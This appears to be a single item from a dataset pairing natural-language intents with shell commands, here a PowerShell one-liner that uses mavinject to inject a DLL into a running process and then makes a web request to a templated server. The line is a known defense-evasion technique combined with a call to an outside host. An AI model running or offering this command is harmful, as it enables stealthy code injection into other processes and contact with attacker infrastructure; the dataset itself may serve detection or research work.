# Natural language intent:
# Inject a DLL into a running process and make a web request using PowerShell.

mavinject $pid /INJECTRUNNING ${file_name} ; Invoke-WebRequest ${server_name} -UseBasicParsing
